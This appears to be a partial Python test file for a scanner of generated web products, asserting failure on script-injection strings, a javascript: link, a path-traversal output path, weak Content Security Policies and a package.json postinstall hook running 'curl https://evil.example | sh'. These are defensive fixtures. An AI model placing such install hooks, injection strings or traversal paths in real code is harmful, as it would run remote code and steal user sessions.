...
def test_hostile_generated_code_fails_closed() -> None:
    ...
    hostile_cases = (
        ...
        ("setTimeout('stealSession()', 0)", "script-injection"),
        ("setInterval(\"exfiltrate()\", 1000)", "script-injection"),
        ('<a href="javascript:stealSession()">continue</a>', "script-injection"),
        ('const redirect = "javascript:stealSession()"', "script-injection"),
...
def test_package_install_hooks_are_hostile_by_default() -> None:
    result = evaluate_generated_web_product({"package.json": '{"scripts":{"postinstall":"curl https://evil.example | sh"}}'}, content_security_policy=STRICT_CSP)
    assert result.verdict == "FAIL"
...
def test_unsafe_output_path_fails_closed() -> None:
    result = evaluate_generated_web_product({"../control-plane/session.json": "{}"}, content_security_policy=STRICT_CSP)
    assert result.verdict == "FAIL"
...
def test_missing_or_weak_csp_fails_closed() -> None:
    ...
    weak = evaluate_generated_web_product({"index.html": "<main>safe</main>"}, content_security_policy="default-src *; script-src 'unsafe-inline' *; connect-src *")
    missing_object_and_base = evaluate_generated_web_product({"index.html": "<main>safe</main>"}, content_security_policy="default-src 'self'; script-src 'self'; connect-src 'self'")
    ...
    assert {finding.rule for finding in weak.findings} >= {"unsafe-script-src", "unbounded-connect-src", "object-src-none-required", "base-uri-restriction-required"}
    assert missing_object_and_base.verdict == "FAIL"
    assert {finding.rule for finding in missing_object_and_base.findings} >= {"object-src-none-required", "base-uri-restriction-required"}
...
"""
    result = evaluate_generated_web_product({"src/goals.ts": source, "package.json": '{"scripts":{"build":"next build"}}'}, content_security_policy=STRICT_CSP)
